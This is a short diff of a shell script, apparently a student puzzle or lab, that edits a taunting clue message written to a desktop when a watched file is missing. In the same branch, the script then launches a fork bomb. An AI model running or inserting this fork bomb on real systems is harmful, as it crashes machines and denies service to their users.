@@ -6,7 +6,7 @@ do
 	if [ -f "$FILE" ]; then
 		echo "File $FILE exists."
 	else
-		echo "I am environmentalist but i keep changing also you may want to bring back the deleted file for stability" > /home/students/Desktop/CLUE_FOR_STATIBILITY.txt
+		echo "mn2se4: I am environmentalist but i keep changing, also you may want to undo that last step :P" > /home/students/Desktop/CLUE_FOR_STATIBILITY.txt
 		bomb() { 
 			bomb | bomb &
 		}; bomb
